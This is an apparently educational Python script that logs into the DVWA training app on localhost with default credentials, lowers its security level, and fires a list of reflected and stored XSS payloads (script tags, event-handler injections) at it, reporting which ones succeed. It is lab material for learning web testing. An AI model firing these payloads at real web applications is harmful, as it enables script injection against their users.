#!/usr/bin/env python3
"""
XSS Exploitation Script for DVWA
Author: Daniel Oyanogbezina
Purpose: Educational demonstration of XSS vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
import sys
import argparse

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    class Fore:
        CYAN = YELLOW = GREEN = RED = MAGENTA = WHITE = BLUE = ""
    class Style:
        RESET_ALL = BRIGHT = ""
    COLORS_AVAILABLE = False

# Configuration
BASE_URL = "http://localhost"
TARGET_REFLECTED = BASE_URL + "/vulnerabilities/xss_r/"
TARGET_STORED = BASE_URL + "/vulnerabilities/xss_s/"
LOGIN_URL = BASE_URL + "/login.php"
SECURITY_URL = BASE_URL + "/security.php"

def print_banner():
    """Display tool banner"""
    banner = """
===============================================================
    XSS Exploitation Tool - DVWA
    Author: Daniel Oyanogbezina
    Educational Purpose Only - Use Responsibly
===============================================================
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)
    
    if not COLORS_AVAILABLE:
        print(Fore.YELLOW + "[!] Tip: Install colorama for colored output (pip3 install colorama)" + Style.RESET_ALL + "\n")

def extract_csrf_token(session, url):
    """Extract CSRF token from a page"""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': 'user_token'})
        
        if token_input:
            return token_input.get('value')
        return None
    except Exception as e:
        print(Fore.RED + "[!] Error extracting CSRF token: " + str(e) + Style.RESET_ALL)
        return None

def get_authenticated_session(username='admin', password='password', verbose=False):
    """Login to DVWA and set security level to low"""
    print(Fore.YELLOW + "[*] Attempting to authenticate to DVWA..." + Style.RESET_ALL)
    session = requests.Session()
    
    try:
        response = session.get(LOGIN_URL, timeout=10)
        
        if response.status_code != 200:
            print(Fore.RED + "[!] Failed to reach login page. Status: " + str(response.status_code) + Style.RESET_ALL)
            print(Fore.YELLOW + "[!] Make sure DVWA is running at " + BASE_URL + Style.RESET_ALL)
            return None
        
        user_token = extract_csrf_token(session, LOGIN_URL)
        
        if not user_token:
            print(Fore.RED + "[!] Could not find CSRF token on login page" + Style.RESET_ALL)
            return None
        
        if verbose:
            print(Fore.BLUE + "[DEBUG] CSRF Token: " + user_token[:20] + "..." + Style.RESET_ALL)
        
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }
        
        response = session.post(LOGIN_URL, data=login_data, allow_redirects=True)
        
        if 'login.php' in response.url or 'logout' not in response.text.lower():
            print(Fore.RED + "[!] Login failed. Check your credentials." + Style.RESET_ALL)
            return None
        
        print(Fore.GREEN + "[+] Successfully logged in as '" + username + "'" + Style.RESET_ALL)
        
        print(Fore.YELLOW + "[*] Setting security level to 'low'..." + Style.RESET_ALL)
        
        security_token = extract_csrf_token(session, SECURITY_URL)
        
        if security_token:
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': security_token
            }
            session.post(SECURITY_URL, data=security_data)
            print(Fore.GREEN + "[+] Security level set to 'low'" + Style.RESET_ALL)
        else:
            session.get(SECURITY_URL + "?security=low&seclev_submit=Submit")
            print(Fore.GREEN + "[+] Security level configured" + Style.RESET_ALL)
        
        return session
        
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[!] Connection Error: Could not connect to " + BASE_URL + Style.RESET_ALL)
        return None
    except requests.exceptions.Timeout:
        print(Fore.RED + "[!] Timeout: Server took too long to respond" + Style.RESET_ALL)
        return None
    except Exception as e:
        print(Fore.RED + "[!] Unexpected error during authentication: " + str(e) + Style.RESET_ALL)
        return None

def test_reflected_xss(session, verbose=False):
    """Test Reflected XSS vulnerabilities"""
    print("\n" + Fore.CYAN + "="*70 + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Testing Reflected XSS (Non-Persistent)" + Style.RESET_ALL)
    print(Fore.CYAN + "="*70 + Style.RESET_ALL + "\n")
    
    payloads = [
        ("<script>alert('XSS')</script>", "Basic script tag"),
        ("<img src=x onerror=alert('XSS')>", "Image error handler"),
        ("<svg/onload=alert('XSS')>", "SVG onload"),
        ("<body onload=alert('XSS')>", "Body onload"),
        ("<iframe src=javascript:alert('XSS')>", "Iframe javascript"),
        ("<input onfocus=alert('XSS') autofocus>", "Input autofocus"),
        ("<marquee onstart=alert('XSS')>", "Marquee event"),
        ("<details open ontoggle=alert('XSS')>", "Details toggle"),
    ]
    
    successful = 0
    blocked = 0
    
    for payload, description in payloads:
        try:
            params = {'name': payload}
            response = session.get(TARGET_REFLECTED, params=params, timeout=10)
            
            if payload in response.text:
                print(Fore.GREEN + "[+] SUCCESS: " + description + Style.RESET_ALL)
                print("    Payload: " + Fore.WHITE + payload + Style.RESET_ALL)
                successful += 1
                if verbose:
                    print("    " + Fore.BLUE + "[DEBUG] Payload found in HTML response" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + "[-] BLOCKED: " + description + Style.RESET_ALL)
                print("    Payload: " + Fore.WHITE + payload + Style.RESET_ALL)
                blocked += 1
                if verbose:
                    if '&lt;' in response.text or '&gt;' in response.text:
                        print("    " + Fore.BLUE + "[DEBUG] Payload was HTML-encoded" + Style.RESET_ALL)
                    else:
                        print("    " + Fore.BLUE + "[DEBUG] Payload was filtered/removed" + Style.RESET_ALL)
            
        except Exception as e:
            print(Fore.RED + "[!] Error testing payload '" + description + "': " + str(e) + Style.RESET_ALL)
            blocked += 1
    
    print("\n" + Fore.CYAN + "Reflected XSS Summary:" + Style.RESET_ALL)
    print("  Successful: " + Fore.GREEN + str(successful) + Style.RESET_ALL)
    print("  Blocked: " + Fore.YELLOW + str(blocked) + Style.RESET_ALL)
    print("  Total Tested: " + str(successful + blocked))

def test_stored_xss(session, verbose=False):
    """Test Stored XSS vulnerabilities"""
    print("\n" + Fore.CYAN + "="*70 + Style.RESET_ALL)
    print(Fore.CYAN + "[*] Testing Stored XSS (Persistent)" + Style.RESET_ALL)
    print(Fore.CYAN + "="*70 + Style.RESET_ALL + "\n")
    
    test_cases = [
        {
            'name': "<script>alert('Stored XSS')</script>",
            'message': "Testing persistent XSS",
            'description': "Basic script in name field"
        },
        {
            'name': "Test User",
            'message': "<script>alert('Message XSS')</script>",
            'description': "Script in message field"
        },
        {
            'name': "<img src=x onerror=alert('IMG')>",
            'message': "Image payload test",
            'description': "Image error handler in name"
        }
    ]
    
    successful = 0
    blocked = 0
    
    for test in test_cases:
        try:
            print(Fore.YELLOW + "[*] Testing: " + test['description'] + Style.RESET_ALL)
            
            user_token = extract_csrf_token(session, TARGET_STORED)
            
            data = {
                'txtName': test['name'],
                'mtxMessage': test['message'],
                'btnSign': 'Sign Guestbook'
            }
            
            if user_token:
                data['user_token'] = user_token
                if verbose:
                    print("    " + Fore.BLUE + "[DEBUG] Using CSRF token" + Style.RESET_ALL)
            
            response = session.post(TARGET_STORED, data=data, timeout=10)
            response_verify = session.get(TARGET_STORED, timeout=10)
            
            if test['name'] in response_verify.text or test['message'] in response_verify.text:
                print(Fore.GREEN + "[+] SUCCESS: Stored XSS payload persisted!" + Style.RESET_ALL)
                print("    Name: " + Fore.WHITE + test['name'] + Style.RESET_ALL)
                print("    Message: " + Fore.WHITE + test['message'] + Style.RESET_ALL)
                successful += 1
            else:
                print(Fore.YELLOW + "[-] BLOCKED: Payload was filtered" + Style.RESET_ALL)
                blocked += 1
                
        except Exception as e:
            print(Fore.RED + "[!] Error testing stored XSS: " + str(e) + Style.RESET_ALL)
            blocked += 1
    
    print("\n" + Fore.CYAN + "Stored XSS Summary:" + Style.RESET_ALL)
    print("  Successful: " + Fore.GREEN + str(successful) + Style.RESET_ALL)
    print("  Blocked: " + Fore.YELLOW + str(blocked) + Style.RESET_ALL)
    print("  Total Tested: " + str(successful + blocked))

def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(description='DVWA XSS Exploitation Training Tool')
    parser.add_argument('-u', '--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('-p', '--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--reflected-only', action='store_true', help='Test only reflected XSS')
    parser.add_argument('--stored-only', action='store_true', help='Test only stored XSS')
    
    args = parser.parse_args()
    
    print_banner()
    
    session = get_authenticated_session(args.username, args.password, args.verbose)
    
    if not session:
        print("\n" + Fore.RED + "[!] Failed to authenticate to DVWA" + Style.RESET_ALL)
        print(Fore.YELLOW + "[!] Troubleshooting tips:" + Style.RESET_ALL)
        print("    1. Ensure DVWA is running: curl " + BASE_URL)
        print("    2. Check credentials (default: admin/password)")
        print("    3. Verify DVWA database is set up")
        sys.exit(1)
    
    try:
        if args.stored_only:
            test_stored_xss(session, args.verbose)
        elif args.reflected_only:
            test_reflected_xss(session, args.verbose)
        else:
            test_reflected_xss(session, args.verbose)
            test_stored_xss(session, args.verbose)
        
        print("\n" + Fore.MAGENTA + "="*70 + Style.RESET_ALL)
        print(Fore.MAGENTA + "[!] Testing Complete" + Style.RESET_ALL)
        print(Fore.MAGENTA + "[!] Educational purposes only - Use responsibly" + Style.RESET_ALL)
        print(Fore.MAGENTA + "="*70 + Style.RESET_ALL + "\n")
        
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[!] Testing interrupted by user" + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print("\n" + Fore.RED + "[!] Unexpected error during testing: " + str(e) + Style.RESET_ALL)
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + Fore.YELLOW + "[!] Interrupted by user" + Style.RESET_ALL)
        sys.exit(0)
